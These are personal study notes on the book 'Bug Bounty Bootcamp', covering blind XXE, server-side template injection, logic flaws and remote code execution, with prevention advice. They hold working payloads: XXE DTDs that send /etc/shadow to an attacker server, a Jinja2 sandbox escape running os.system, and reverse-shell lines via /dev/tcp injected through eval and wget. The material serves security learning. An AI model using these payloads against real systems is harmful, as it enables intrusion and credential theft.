  - To get the Blind XXE to work, you need to utilize _parameter entities_.
    - Parameter entities are XML entities that can be referenced only elsewhere within the DTD.
    - They are declared and referenced with a percent (%) character.
    - Comments in XML have the following syntax: `<!--Your comment-->`
    ```
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE example [
      <!ENTITY % file SYSTEM "file:///etc/shadow"> <!--Declares a parameter called "file" that contains "/etc/shadow"-->
      <!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>"> <!--Declares a parameter entity named "ent" that contains a dynamic declaration of another parameter entity called "exfiltrate"-->
      %ent;
      %exiltrate;
    ]>
    ```
    - `&#x25` is the hex-encoded version of the percentage sign (%)
      - Depending on your target, hex encoding is sometimes needed for special characters within dynamic declarations.
    - The exfiltrated entity points to the attacker's server with the contents of `/etc/shadow` in the URL parameter.
    - The DTD references `ent` to declare the `exfiltrate` entity and then references `exfiltrate` to trigger the outbound request.
  - This also may not work because, according to XML specifications, parameter entities are treated differently in inline DTDs (DTDs within the XML doc specified with the `DOCTYPE` tag) and external DTD (A separate DTD hosted elsewhere).
    - Within DTDs, parameter entities cannot be referenced within markups, so this line won't work: `<!ENTITY &#x25; exilftrate SYSTEM 'http://attacker_server/?file;'>`, but in external DTDs, no such restrictions exist.
  - To exiltrate data with a blind XXE, you have to overcome this restriction byhosting an external DTD on your server.

    - ex. [xxe.dtd](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/Scripts/XXEs/xxe.dtd) hosted on server:

    ```
    <!--Use this by hosting it on your attacker server-->
    <!--Change the file to whatever file you're hoping to exiltrate-->
    <!--Change the attacker_server to your server-->

    <!ENTITY % file SYSTEM "file:///etc/shadow">
    <!ENTITY % ent "<!ENTITY &#x25; exiltrate SYSTEM 'http://attacker_server/?%file;'>">
    %ent;
    %exiltrate;

    <!-- Make the target parser interpret your DTD by specifying it within a parameter entity and referencing that entity with a payload like:-->
    <!-- Payload:

    <?xml version="1.0" encoding="UTF-8"
    <!DOCType example [
      <!ENTITY % xxe SYSTEM "http://attacker_server/xxe.dtd">
      %xxe;
      ]>

    -->
    ```

    - The target server will parse the submitted XML file and notice that a parameter entity is referencing an external file.
    - The target server will retrieve and parse the external DTD, so you payload will execute, and the target will send the exiltrated data back to your server.
    - Notice we only used parameter entities and did not use external entities at all.
    - If the parser blocks external entities or limits the referencing of entities to protect against XXE, you can use this technique as well.
    - This strategy can exiltrate only a signel file of the target file, because the newline charcater (\n) within target files will interrupt the outbound URL and may even cause the HTTP request to fail.
    - To avoid this, you can force the parser to return a descriptive error message.
      - ex.
      ```
      <!ENTITY % file SYSTEM "file:///etc/shadow">
      <!ENTITY % ent "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/?%file;'>">
      %ent;
      %error;
      ```
    - This works by including the contents of `/etc/shadow` in the URL parameter of the nonexistent filepath.
    - You then submit the same payload to the target to trigger the attack with the new external DTD:

    ```
    <?xml version="1.0" encoding="UTF-8"
    <!DOCType example [
      <!ENTITY % xxe SYSTEM "http://attacker_server/xxe-error.dtd">
      %xxe;
      ]>
    ```

    - This should result in the parser delivering the desired file contents as a File Not Found error:
      `java.io.FileNotFoundException: file://nonexistent/File Contents of /etc/shadow`

**Performing Denial-of-Service Attacks**

- I couldn't care less about DoS and DDoS attacks because they're always out of scope.
  - If I find I really want to dive more into these I may come back and finish this section. As for now, I'm skipping it.

**More About Data Exfiltration Using XXEs**

- XXE data exfiltration becomes more complicated if the parser is hardened against XXE attacks, and if you're trying to read files of specific formats.
- If you're trying to exfil files that contain XML special characters, such as angle brackets (<>), quotes (' or "), or ampersand (&), accessing these files directly via an XXE would break the syntax of your DTD and interfere with exfil.
  - XML has a feature that deals with this issue using `CDATA`.
  - Characters wrapped within CDATA tags are not seen as special characters.
  - example external DTD using CDATA:
  ```
  <!ENTITY % file SYSTEM "file:///passwords.xml">
  <!ENTITY % start "<!CDATA[">
  <!ENTITY % end "]]>">
  <!ENTITY % ent "<!ENTITY &#x25; exfiltrate 'http://attacker_server/?start;%file;%end;'>">
  %ent;
  %exfiltrate;
  ```
  - This declares two parameter entities containing the strings `"<![CDATA"` and `"]]>"`
  - It then constructs an exiltration URL that will not break the DTD's syntax by wrapping the file's contents in a `CDATA` tag.
  - The concatenated `exfiltrate` entity declaration will become: `<!ENTITY % exfiltrate 'http://attacker_server/?<!CDATA[CONTENTS_OF_THE_FILE]]>'>`
  - With the growing complexity of our payloads, you can use a linter such as XmlLint to check your files for syntax errors.
    - In my Arch Linux github, I go over setting up nvim with linting to help find errors, highlight syntax, etc.
  - After hosting the new DTD file, execute the new payload on the target:
  ```
      <?xml version="1.0" encoding="UTF-8"
    <!DOCType example [
      <!ENTITY % xxe SYSTEM "http://attacker_server/xxe-cdata.dtd">
      %xxe;
      ]>
  ```
- If the target is PHP-based, you can use PHP wrappers to let you convert the desired data into base64 format so you can use it to read XML files or even binary files:
  ```
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/shadow">
  <!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>">
  %ent;
  %exfiltrate;
  ```
- FTP can also be used to send data directly while bypassing special character restrictions.
  - HTTP has many special character restrictions and typically restricts the length of the URL. Using FTP instead is an easy way to bypass that.
  - Run a simple FTP server on your machine and modify your malicious DTD accordingly.
  ```
  <!ENTITY % file SYSTEM "file:///etc/shadow">
  <!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'ftp://attacker_server:2121/?%file;'>">
  %ent;
  %exiltrate;
  ```
  - The book uses this simple Ruby server [script](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb).

**Finding Your First XXE**

1. Find data entry points that you can use to submit XML data.
2. Determine whether the entry point is a candidate for a classic or blind XXE. The endpoint might be vulnerable to classic XXE if it returns the parsed XML data in the HTTP response. If the endpoint does not return results, it might still be vulnerable to blind XXE, and you should set up a callback listener for your tests.
3. Try out a few test payloads to see if the parser is improperly configured. In the case of classic XXEs, you can check whether the parser is processing external entities. In the case of blind XXEs, you can make the server send requests to your callback listener to see if you can trigger outbound interaction.
4. If the XML parser has the functionalities that make it vulnerable to XXE attacks, try to exfiltrate a common system file, like `/etc/hostname`.
5. You can also try to retrieve some more sensitive system files, like `/etc/shadow` or `~/.bash_history`.
6. If you cannot exfiltrate the entire file with a simple XXE payload, try to use an alternative data exfiltration method.
7. See if you can launch an SSRF attack using the XXE.
8. Draft your first XXE report!

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

## Chapter 16: Template Injection

"_Template engines_ are a type of software used to determine the appearance of a web page. Developers often overlook attacks that target these engines, called _server-side template injections (SSTIs)_, yet they can lead to severe consequences, like remote code execution. They have become more common in the past few years, with instances found in the applications of organizations such as Uber and Shopify."

**Mechanisms**

"To understand how template injections work, you need to understand the mechansisms of the template engines they target. Simply put, templat engines combine application data with web templates to produce web pages. These web templates, written in template languages such as Jinja, provide developers with a way to specify how a page should be rendered. Together, web templates and template engines allow developers to separate server-side application logic and client-side presentation code during web development."

_Template Engines_

- How Jinja and Python work together:
- ex. [Template file](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/Scripts/TemplateInjection/example.jinja) written in Jinja:
  ```
  <html>
    <body>
    <h1>{{ list_title }}</h1>
    <h2>{{ list_description }}</h2>
    {% for item in item_list %}
      {{ item }}
      {% if not loop.last %}
    {% endfor %}
    </body>
  </html>
  ```
  - This template looks like HTML but it contains special syntax to indicate content that the template engine should interpret as template code.
  - In Jinja, any code surrounded by double curly brackets (`{{}}`) is interpreted as a Python expression and code surrounded by percent sign pairings within curly brackets (`{% %}`) are interpreted as Python statements.
    - An _expression_ is either a variable or a function that returns a value.
    - A _statement_ is code that doesn't return anything.
  - You can see in the above Jinja that we embed the expressions `list_title` and `list_description` in html header tags.
  - The code then creates a loop to render all items in the `item-list` variable in the HTML body.
  - The dev can then combine the template with Python code to create the complete HTML page.
- ex. [Python code](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/Scripts/TemplateInjection/ExampleCreate.py):

```
from jinja2 import Template

with open('example.jinja') as f:
    tmpl = Template(f.read())

print(tmpl.render(
    list_title="Chapter Contents",
    list_description="Here are the contents of chapter 16.",
    item_list=[
        "Mechanisms Of Template Injection",
        "Preventing Template Injection",
        "Hunting For Template Injection",
        "Escalating Template Injection",
        "Automating Template Injection",
        "Find your First Template Injection!"]
))
```

- The Python code reads the template file `example.jinja`
- It generates an HTMl page dynamically by providing the template with the values it needs (line 4).
- Renders the template with the values `Chapter Contents` as `list_title`.
- `Here are the contents of chapter 16.` as `list_description`
- Has a list of values as `item_list`.
  - You will need to have jinja2 installed to be able to run this python code.
  - You can do that using a package manager, or by creating an python environment and installed jinja2 with pip.
- Running this Python script with the `example.jinja` file will produce the following:

```
<html>
  <body>
  <h1>Chapter Contents</h1>
  <h2>Here are the contents of chapter 16.</h2>
  Mechanisms Of Template Injection,
  Preventing Template Injection,
  Hunting For Template Injection,
  Escalating Template Injection,
  Automating Template Injection,
  Find Your First Template Injection!
  </body>
</html>
```

- Template engines are used to make rendering web pages more efficient by standardizing the format and automating the creation of content.
- Separating HTML code and application logic also make it easier for developer to modify and maintain parts of the HTML code.
- Popular template engines:
  - Works with Python: Jinja, Django, and Mako.
  - Works with PHP: Smarty, Twig.
  - Works with Java: Apache FreeMarker, Apache Velocity.

_Injecting Template Code_

"Template injection vulnerabilities happen when a user is able to inject input into templates without proper sanitization. Our previous example isn't vulnerable to template injection vulnerabilities because it does not embed user input into templates. It simply passes a list of hardcoded values as the `list_title`, `list_description`, and `item_list` into the template. Even if the preceding Python snippet does pass user input into the template like this, the code would not be vulnerable to template injection because it is safely passing user input into the template as data:"

```
from jinja2 import Template
with open('example.jinja') as f:
  tmpl = Template(f.read())
print(tmpl.render(
  list_title = user_input.title,
  list_description = user_input.description,
  item_list = user_input.list,
))
```

- Template engines become vulnerable when developers treat templates like strings in programming languages and directly concatenate user input into them.
  - This is because the template engine won't be able to distinguish between user input and the developer's template code.
  - ex.
  ```
  from jinja2 import Template
  tmpl = Template("
  <html><h1>The user's name is:" + user_input + "</h1></html")
  print(tmpl.render())
  ```
  - This code creates a template by concatenating HTML code and user input together, then renders the template.
  - If the user submits a GET request to display their name:
  ```
  GET /display_name?name=Vickie
  Host: example.com
  ```
  - This will generate:
  ```
  <html>
    <h1>The user's name is: Vickie</h1>
  </html>
  ```
  - An attacker could submit a payload like:
  ```
  GET /display_name?name={{1+1}}
  Host: example.com
  ```
  - Jinja2 interprets anything within double curly brackets `{{}}` as Python code.
    - This means that an attacker could run any code they wanted and get the results returned within the HTML page.
    - If the python code used to render the templates has imported things like `os` or has higher privileges than necessary, you could start getting RCEs.

**Prevention**

- Regularly patch and update frameworks and libraries.
- Prevent users from supplying user-submitted templates if possible.
- Use a template engine that provides a hardened sandbox environment that can safely handle user input.
  - There are still many published sandbox escape exploits, so this isn't enough on its own.
- Implement an allowlist for allowing attributes in templates to prevent the kind of RCE exploit that is shown later in the chapter.
- Limit descriptive errors that can help attackers develop exploits. Handle these errors properly and return a generic error page to the user.
- Sanitize user input before embedding it into web templates and avoid injecting user-supplied data into templates whenever possible.

**Hunting for Template Injection**

"As with hunting for many other vulnerabilities, the first step in finding template injections is to identify locations in an application that accept input."

_Step 1: Look for User-Input Location_

- Places to look: URL paths, parameters, fragments, HTTP request headers and body, file uploads, etc.
- Applications often use template engines to generate customized email or home pages based on the user's information.
  - Look for endpoints that accept user input that will eventually be displayed back to the user.
- Template injection endpoints and XSS endpoints are the same or similar, use the strategy outlind in Chapter 6 to identify candidates.

_Step 2: Detect Template Injection by Submitting Test Payloads_

- Inject a test string into noted Endpoints.
  - ex. `{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx]`
  - This test string is good at inducing errors in popular template engines.
  - `${...}` is the special syntax for expressions in FreeMarker and Thymeleaf Java templates.
  - `{{...}}` is the syntax for expressions in PHP templates such as Smarty and Twig, as well as Python templates like Jinja2.
  - `<%=...%>` is the syntax for the Embedded Ruby Template (EBR).
  - `[*random expression*]` makes the server interpret the random expression as a list item if the user input is placed into an expression tag within the template.
  - `abcxx` is used to make the template engine resolve the variable with the name abcxx, which hopefully hasn't been defined in the application.
  - If you get an error from this payload, it means the special characters are being treated as special by the template engine and indicates a template injection vulnerability.
  - Further test for a vuln by providing input that the template engine can successful resolve:
    - `{{7*7}}` or `${7*7}` or `<%=7*7%>`
    - If any of these return 49, it means the data is being interpreted as code by the template engine.
    - Use the results from the first test string to decide which to use, or use all 3 separately to see what happens.
  - Note that these payloads may not be displayed immediately, or they may be displayed somewhere else (future web pages, emails, and files).
    - ex. if an application renders an input field unsafely when generating a bulk email, you will need to look at the generated email to check whether your attack has succeeded.
- Testing the logic of the application:
  - ex. The three test payloads `{{7*7}}` or `${7*7}` or `<%=7*7%>` work with this code snipped:
    ```
    from jinja2 import Template
    tmpl = Template("
    <html><h1>The user's name is: " + user_input + "</h1></html>")print(tmpl.render())
    ```
  - ex. If the user input is concatenated into the template as a part of the template's logic:
    ```
    from jinja2 import Template
    tmpl = Template("
    <html><h1>The user's name is: {{" + user_input + "}}</h1></html>")print(tmpl.render())
    ```
    - Here the user input is placed into the template within expression tags `{{...}}`.
      - Because of this, you will need to remove the `{{}}` around your payload to see if the input will execute as code.

_Step 3: Determine the Template Engine in Use_

- If your test payload caused an error, the error message itself may contain the name of the template engine.
  `jinja2.exceptions.UndefinedError: 'abcxx' is undefined.`
- If this didn't produce a descriptive error like the one above, you can test the application specific payloads `{{7*7}}` or `${7*7}` or `<%=7*7%>`.
  - As these correspond to the different engines we described above, whichever one works will narrow down what engine is in use, or at least what language is in use. All you need to know is what language to write your payload in.
- Getting clever: You could also use a test payload like `{{7*'7'}}` which will return `7777777` in Jinja2 and 49 in twig.
- [PortSwigger payloads](https://portswigger.net/research/server-side-template-injection) for more info and payloads.

**Escalating the Attack**

- Using the `7*7` examples from before are usually enough to prove a template injection to security teams.
  - Escalating from this point can help to show the severity of the bug and possibly lead to a higher payout.
- Escalating to show the execution of system commands can be a significant upgrade.
  - If you can execute arbitrary system commands and read the `/etc/shadow` file, you could then cracked the hashed passwords there and possibly get access to a sys admin account.

_Searching for System Access via Python Code_

- In python, you can execute system commands via the `os.system()` function from the `os` module.
  - ex. `os.system(ls)` to list the contents of the current directory.
- If the python application hasn't imported the os module, and you send a request like:
  ```
  GET /display_name?name={{os.system('ls')}}
  Host: example.com
  ```
  - You will most likely get the error: `jinja2.exceptions.UndefinedError: 'os' is undefined`
  - You can import modules using the syntax: `import MODULE` or `from MODULE import *` or `__import__('MODULE')`
  - Trying to import a module from the template engine like the following example will also probably not work:
    ```
    GET /display_name?name="{{__import__('os').system('ls')}}"
    Host: example.com
    ```
    - This will most likely produce the error: `jinja2.exceptions.UndefinedError: '__import__' is undefined`
    - Most template engines block dangerous functionalities like `import` or make an allowlist that allows users to perform only certain operations within the template.
    - However, you may be able to escape these sandboxed environments - demonstrated in the next section.

_Escaping the Sandbox by Using Python Built-in Functions_

"...When you're barred from importing certain useful modules or importing anything at all, you need to investigate functions that are already imported by Python by default. Many of these built-in functions are integrated as a part of Python's `object class`, meaning that when we want to call these functions, we can create an object and call the functions as a method of that object. For example, the following GET request contains Python code that lists the Python classes available:"

```
GET / display_name?name="{{[].__class__.__bases__[0].__subclasses__()}}"
Host: example.com
```

- Breaking it down:
- `[].__class__`: Creates an empty list and calls its `__class__` attribute, which refers to the class the instance belongs to, list.
- `[].__class__.__bases__`: Uses the `__bases__` attribute to refer to the base classes of the list class.
- `[].__class__.__bases__[0]`: Returns a tuple of all the base classes of the class list.
  - A `base class` is a class taht the current class is built from; `list` has a base class called `object`.
  - We access the `object` class by referring to the first item in the tuple `[0]`.
- `[].__class__.__bases__[0].__subclasses__()`: `__subclasses__` is used to refer to all the subclasses of the class.
- When you submit this payload into the template injection endpoint, you should see a list of classes like this:
  ```
  [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, class 'list'>,...]
  ```
- When we use this method, all the subclasses of the `object` class become accessible to us.
  - The next step is to look for a method in one of these classes that we can use for command execution.
  - Not all application's Python environments wil have the same classes.
  - Some payloads will work on some applications but not on others. You'll have to try different ones until you see success.
- The `__import__` function is blocked by Jinja2, so we will need to access it via the `builtins` module.
  - `builtins` module provides direct access to all of Python's built-in classes and functions.
  - Most Python modules hae `__builtins__` as an attribute that refers to the built-in module, so you can recover the `builtins` module by referring to the `__builtins__` attribute.
- Within all the subclasses listed in `[]/__class__.__bases__[0].__subclasses__()`, there is a class named `catch_warnings` that we can build an exploit around.
  - To find the `catch_warnings` subclass, or to ensure it's there, you can inject the following loop into the template code:
  ```
  {% for x in [].__class__.__bases__[0].__subclasses__() %}     #Loops through the list of available classes.
  {% if 'catch_warnings' in x.__name__ %}                       #Finds the class matching the string `catch_warnings`
  {{x()}}                                                       #Instantiates an object of that class.
  {%endif%}
  {%endfor%}
  ```
  - Objects of the class `catch_warnings` have an attribute called `_module` that refers to the `warnings` module.
  - We use the reference to the module to refer to the `builtins` module:
  ```
  {% for x in [].__class__.__bases__[0].__subclasses__() %}
  {% if 'catch_warnings' in x.__name__ %}
  {{x()._module.__builtins__}}
  {%endif%}
  {%endfor%}
  ```
  - This should return a list of built-in classes and functions, including the function `__import__`:
  ```
  {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the 'nil' object: Ellipsis represents '...' in slices.", '__package__':'', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, ...}
  ```
  - You can see the last entry before we cut it off that we have access to the import functionality this way.
- Since built-in classes and functions are stored in a Python dictionary, you can access the `__import__` function by referring to the key of the function's entry in the dictionary:
  ```
  {% for x in [].__class__.__bases__[0].__subclasses__() %}
  {% if 'catch_warnings' in x.__name__ %}
  {{x()._module.__builtins__['__import__']}}
  {%endif%}
  {%endfor%}
  ```
  - Now we can use the `__import__` function to import the `os` module:
  ```
  {% for x in [].__class__.__bases__[0].__subclasses__() %}
  {% if 'catch_warnings' in x.__name__ %}
  {{x()._module.__builtins__['__import__']('os')}}
  {%endif%}
  {%endfor%}
  ```
  - Lastly, call the `system()` function and put the command we want to execute as the `system()` function's argument:
  ```
  {% for x in [].__class__.__bases__[0].__subclasses__() %}
  {% if 'catch_warnings' in x.__name__ %}
  {{x()._module.__builtins__['__import__']('os').system('whoami')}}
  {%endif%}
  {%endfor%}
  ```
  - If all works as it should, you can now execute arbitrary system commands.

_Submitting Payloads for Testing_

- A common way of proving you've achieved command execution and gained access to the operating system is to create a file with a unique name like "template_injection_by_YOUR_BUG_BOUNTY_USERNAME.txt"

  ```
  {% for x in [].__class__.__bases__[0].__subclasses__() %}
  {% if 'catch_warnings' in x.__name__ %}
  {{x()._module.__builtins__['__import__']('os').system('touch template_injection_by_YOU')}}
  {%endif%}
  {%endfor%}
  ```

- Resources for learning more about sandbox escapes:
  - [CTF Wiki](https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape)
  - [HackTricks](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes/) - HackTricks is an amazing resource in general.
  - [Programmer Help](https://programmer.help/blogs/python-sandbox-escape.html)

**Automating Template Injection**

- A tool built to automate the template injection process: [tplmap](https://github.com/epinna/tplmap/).
  - This tool can scan for template injections, determine the template engine in use, and construct exploits.
  - Does not support every template engine.

**Finding Your First Template Injection**

1. Identify an opportunity to submit user input to the application. Mark down candidates of template injection for further inspection.
2. Detect template injection by submitting test payloads. You can use either payloads that are designed to induce errors, or engine-specific payloads designed to be evaluated by the template engine.
3. If you find an endpoint that is vulnerable to template injection, determine the template engine in use. This will help you build an exploit specific to the template engine.
4. Research the template engine and programming language that the target is using to construct an exploits.
5. Try to escalate the vulnerability to arbitrary command execution.
6. Create a proof of concept that does not hard the targeted system. A good way to do this is to execute `touch template_injection_by_YOU.txt` to create a specific proof-of-concept file.
7. Do a report.

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 17: Application Logic Errors and Broken Access Control

"Application logic errors and broken access control vulnerabilities are quite different from those we've discussed so far. Most of the vulnerabilities covered in previous chapters are caused by faulty input validation: they happen when polluted user input is processed without proper sanitization. These malicious inputs are syntactically different from normal user input and are designed to maniplate application logic and cause damage to the application or its users."

- Application logic errors and broken access control issues are often triggered by perfectly valid HTTP requests containing no illegal or malformed character sequences.
  - Still, these requests are crafted intentionally to misuse the application's logic for malicious purposes or circumvent the application's access control - Soooo still illegal...
- Application logic errors are logic flaws in the application.
- Broken access control occurs when sensitive resources or functionality are not properly protected.
  - Both generally require more creativity and intuition than technical knowledge.

**Application Logic Errors**

- Also referred to as _business logic vulnerabilities_.
  - They use legitimate logic flow of the application to the result of negative consequences for the organization.
- ex. _Multifactor Authentication_
  - Forms of multifactor authentication: phone number to authenticate with (text or call), email authentication, authentication app, physical key, biometrics.
  - Can be vulnerable to what the author calls "_skippable authentication step_" that allows users to skip a step of the authentication process.
  - ex. 3-step authentication process: Step 1: (password check), Step 2: (MFA), Step 2: (Security Question).
    - Normal authentication flow:
    1. The user visits `https://example.com/login/`. The application prompts the user for their password, and the user enters it.
    2. If the password is correctly entered, the application sends an MFA code to the user's email address and redirects the user to `https://example.com/mfa/`. The user enters their MFA code.
    3. The application checks the MFA code, and if it's correct, redirects to `https://example.com/security_questions/.` The user then answers security questions provided by the application. If successful, the user is logged in.
    - You may be able to request the final step to bypass steps 1 and 2.
    - You may be able to bypass step 2 after completing step 1.
- ex. _Multi-step checkout process_

  - When users save a new payment method, the site will verify whether the credit card is valid and current. That way, when the user submits an order via a saved payment method, the application won't have to verify it again.
  - ex. POST request to submit the order with a saved payment method:
    - payment method is pre-verified, verification not done at time or checkout.

  ```
  POST /new_order
  Host: shop.example.com

  (POST request Body)
  item_id=123
  &quantity=1
  &saved_card=1
  &payment_id=1
  ```

  - ex. POST request to submit order with new payment method:
    - payment method is verified at time of checkout.

  ```
  POST /new_order
  Hst: shop.example.com

  (POST request Body)
  item_id=123
  &quantity=1
  &card_number=1234-1234-1234-1234
  ```

  - In these examples, the payment method is only verified if the customer is using a new payment method.
  - The application determines whether the payment method is new by the existence of the `saved_card` parameter in the HTTP request.
  - So a malicious user can submit a request with a `saved_card` parameter _and_ a fake credit card number, resulting in fraudulent purchases using an unverified card:

  ```
  POST /new_order
  Host: shop.example.com

  (POST request Body)
  item_id=123
  &quantity=1
  &saved_card=1
  &card_numer=0000-0000-0000-0000
  ```

  - These application logic errors are prevalent because they cannot be scanned for automatically, they manifest is too many ways, and most current vulnerability scanners don't have the intelligence to understand application logic or business requirements.

**Broken Access Control**

- The previous example could also be considered a broken access control issue.

_Exposed Admin Panels_

- Applications sometimes neglect or forget to secure sensitive functionalities like admin panels used to monitor the application, or believe that these admin panels are secure because they're hidden (not so hidden) behind obscure URLs or ports.
  - ex. `https://example.com/YWRtaW4/admin.php`: But this could still be found through google dorking or URL brute-forcing.
  - ex. The admin panel is properly secure so that only those with valid admin creds can access it, but if the request is coming from an internal IP that the application trusts, the admin panel won't ask for authentication.
    - If an attacker can find an SSRF vuln, they could bypass authentication.
  - ex. Attackers could bypass access control by tampering with cookies or request headers if they're predictable.
    - You may be able to bypass access control by providing a cookie like `admin=1` in your HTTP request.
  - ex. You may be able to browse past the access control point.
    - The admin panel login is located at `https://example.com/YWRtaW4/admin.php`, which will ask you to authenticate, but you may be able to browse directly to `https://example.com/YWRtaW4/dashboard.php`, bypassing the login screen.
- All of these suggestions seem very unlikely in today's landscape, but hey, worth a shot!

_Directory Traversal Vulnerabilities_

"_Directory traversal vulnerabilities_ are another type of broken access control. They happen when attackers can view, modify, or execute files they shouldn't have access to by manipulating filepaths in the user-input fields."

- ex. Browsing to `https://example.com/uploads?file=example.jpeg` will cause the app to display the file named example.jpeg in the users uploads folder located at `/var/www/html/uploads/USERNAME`.
  - If not properly sanitized, the user could access other system files through using ../../../FILE_NAME.
  - ex. `https://example.com/uploads?file=../../../../../../../../etc/shadow`
- Not in the book: I've use directory traversals to achieve a reverse shell by dropping a reverse shell payload in the uploads folder, then browsing to the file in the browser to trigger the payload. The `www` user will almost never have the privileges to be able to access `/etc/shadow` but you could get the `www` user to connect back to you so you can escalate privileges from a reverse shell.

**Prevention**

"You can prevent application logic errors by performing tests to verify that the application's logic is working as intended. This is best done by someone who understands both the business requirements of the organization and the development process of the application. You'll need a detailed understanding of how your application works, how users interact with each other, how functionalities are carried out, and how complex processes work."

- Implement granular access control policies on all files and actions on a system.
  - The code that implements the access control policies should also be audited for potential bypasses.
- Conduct penetration tests to find holes in the access policy or its implementation.
- Ensure access control policies are accurate.
- Make sure that all the ways of accessing a service have consistent access control mechanisms.
  - It shouldn't matter if the app is accessed via a mobile device, desktop device, or API endpoint.
  - The same requirements, such as MFA, should apply for everyone individual access point.

**Hunting for Application Logic Errors and Broken Access Control**

"Application logic errors and access control issues are some of the easiest bugs for beginners to find. Hunting for these vulnerabilities doesn't involve tampering with code or crafting malicious inputs; instead, it requires creative thinking and a willingness to experiment."

_Step 1: Learn About Your Target_

- As usual, browse the target application as a regular user to uncover functionalities and interesting features.
- Read the application's engineering blogs and documentation, the more you understand about the architecture, dev process, and business needs/model, the easier it will be to spot vulnerabilities.
- New features are juicy targets for testing.
- Find our about the architecture and look for known vulnerabilities
  - Check if anything is outdated.

_Step 2: Intercept Requests While Browsing_

- Use a proxy to track the process of what requests are sent while interacting with specific features.
- Take note of how sensitive functionalities and access control are implemented, and how they interact with client requests.
  - Does the new payment option have request parameters that indicate the payment type or how much will be charged? Mess with these values.
- When accessing the admin portal, are any special HTTP headers or parameters sent?

_Step 3: Think Outside the Box_

- Mess with values, add parameters you think might exist but aren't included in the requests, can you combine parameters that usually only occur separately, can you switch payment type to a gift card? Get creative.

**Escalating the Attack**

- Try to combine the application logic error or broken access control with other vulnerabilities to increase impact.
- If you can find the configuration files or tech stack, search for CVEs that pertain to the software version in use.
- Think of what an attacker could do with the vulnerabilities you find, then try to exploit them (just make sure you don't do any damage).

**Finding Your First Application Logic Error or Broken Access Control**

1. Learn about your target application. The more you understand about the architecture and development process of the web application, the better you'll be at spotting these vulnerabilities.
2. Intercept requests while browsing the site and pay attention to sensitive functionalities. Keep track of every request sent during these actions.
3. Use your creativity to think of ways to bypass access control or otherwise interfere with application logic.
4. Think of ways to combine the vulnerability you've found with other vulnerabilities to maximize the potential impact of the flaw.
5. Draft your report.

Note: This chapter seems pretty light it comparison to the last. There is a lot of stuff that can be done with broken access control and application logic errors. They are some of the move prevalent vulnerabilities out there according to the OWASP top 10. I would say this chapter doesn't capture the tip of the iceberg.

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Chapter 18: Remote Code Execution

"\*Remote code execution (RCE) occurs when an attacker can execute arbitrary code on a target machine because of a vulnerability or misconfiguration. RCEs are extremely dangerous, as attackers can often ultimately compromise the web application or even the underlying web server."

- RCE can be achieve through various techniques: SQL injection, Insecure Deserialization, Template Injection, etc.

**Mechanisms**

"Sometimes attackers can achieve RCE by injecting malicious code directly into executed code. These are _code injection vulnerabilities_. Attackers can also achieve RCE by putting malicious code into a file executed or included by the victim application, vulnerabilities called _file inclusions_" - I was writing about file inclusions in the last chapter when I mentioned how to get a reverse shell.

**Code Injection**

- Code injection vulns occur when applications allow user input to be confused with executable code.
  - Can be unintentional where the application passes unsanitized data into executed code.
  - It could also be build into the app as a feature.
- ex. Python calculator:

  ```
  def calculate(input):
    return eval("{}".format(input))

  result = calculate(user_input.calc)
  print("The result is {}.".format(result))
  ```

  - Users can interact with this script using the GET request:

  ```
  GET /calculator?calc=1+2
  Host: example.com
  ```

  - The calculator app takes user-provided input and executes it as Python code. Uh-oh.

  ```
  GET /calculator?calc="__import__('os').system('ls')"
  Host: example.com
  ```

  - Unlike with the frameworks in the previous chapter where we had to find a way to import `os` in order to run system commands, this script has no such protections and so you can execute commands by importing the `os` module without much effort.
  - ex. Reverse shell through calculator app:

  ```
  GET /calculator?calc="__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')"
  Host: example.com
  ```

  - This reverse shell script will connect back to the attackers fictional IP address at 10.0.0.1 over port 8080.

- ex. example.com has a functionality that allows you to download a remote file and view it on the website.

  ```
  import os

  def download(url):
    os.system("wget -O- {}".format(url))

  display(download(user_input.url))
  ```

  - `wget` is used to download web pages given a URL.
  - `-O-` option makes wget download the file and display the standard output.
  - In linux systems, the semicolon (;) separates individual commands.
  - This above script requires you to use wget for something, however, after passing a URL to satisfy this condition, you can use a semicolon to inject additional code:

  ```
  GET /download?url="google.com;bash -i >& /dev/tcp/10.0.0.1/8080 0>1"
  Host: example.com
  ```

_File Inclusion_

"Most programming languages have functionality that allows developers to _include_ external files to evaluate the code contained within. This is useful when developers want to incorporate external asset files like images into their applications, make use of external code libraries, or reuse code that is written for a different purpose."

- _file inclusion vulnerabilities_ have two subtypes: Remote file inclusion, and Local file inclusion.
  - _Remote File Inclusion_ occurs when the application allows arbitrary files from a remote server to be included.
    - This happens when applications dynamically include external files and scripts on their pages and use user input to determine the location of the included file.
- ex. A vulnerable PHP application that calls the `include` function on the value of the user-submitted HTTP GET parameter `page`:

  ```
  <?php
    // Some PHP code
    $file = $_GET["page"];
    include $file;

    // Some PHP code
  ?>
